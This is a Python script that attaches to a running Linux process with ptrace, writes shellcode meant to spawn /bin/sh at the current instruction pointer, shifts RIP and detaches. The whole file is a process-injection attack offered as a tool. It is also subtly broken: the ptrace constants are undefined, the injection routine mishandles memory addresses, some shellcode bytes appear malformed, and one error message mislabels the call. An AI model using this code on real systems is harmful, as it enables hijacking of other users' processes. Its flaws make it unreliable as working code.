import ctypes
import sys
import struct

# Define necessary constants
SHELLCODE_SIZE = 32

# Define the shellcode
shellcode = bytearray(
    b"\x48\x31\xc0\x48\x89\xc2\x48\x89"
    b"\xc6\x48\x8d\x3d\x04\x00\x00\x00"
    b"\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
    b"\x2f\x73\x68\x00\xcc\x90\x90\x90"
)

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Define necessary C types
pid_t = ctypes.c_int
c_void_p = ctypes.c_void_p

# Define necessary structures
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

# Define necessary functions
ptrace = libc.ptrace
ptrace.argtypes = [ctypes.c_int, pid_t, c_void_p, c_void_p]
ptrace.restype = ctypes.c_long

def inject_data(pid, src, dst, length):
    s = (ctypes.c_uint * (length // 4)).from_buffer(src)
    d = (ctypes.c_uint * (length // 4)).from_address(ctypes.addressof(dst))
    for i in range(length // 4):
        if ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(d[i]), ctypes.c_void_p(s[i])) < 0:
            raise OSError("ptrace(POKETEXT):")

def main():
    # Check for correct usage
    if len(sys.argv) != 2:
        print("Usage:")
        print("\t{} <pid>".format(sys.argv[0]))
        sys.exit(1)

    # Convert PID argument to integer
    target = int(sys.argv[1])

    print("+ Tracing process {}".format(target))

    # Attach to the process
    if ptrace(PTRACE_ATTACH, target, None, None) < 0:
        raise OSError("ptrace(ATTACH):")

    print("+ Waiting for process...")
    libc.wait(None)

    print("+ Getting Registers")
    regs = user_regs_struct()
    if ptrace(PTRACE_GETREGS, target, None, ctypes.byref(regs)) < 0:
        raise OSError("ptrace(GETREGS):")

    # Inject shellcode into the current RIP position
    print("+ Injecting shell code at {:x}".format(regs.rip))
    inject_data(target, shellcode, regs.rip, SHELLCODE_SIZE)

    # Modify instruction pointer
    regs.rip += 2
    print("+ Setting instruction pointer to {:x}".format(regs.rip))

    # Set the registers
    if ptrace(PTRACE_SETREGS, target, None, ctypes.byref(regs)) < 0:
        raise OSError("ptrace(GETREGS):")

    print("+ Run it!")

    # Detach from the process
    if ptrace(PTRACE_DETACH, target, None, None) < 0:
        raise OSError("ptrace(DETACH):")

if __name__ == "__main__":
    main()
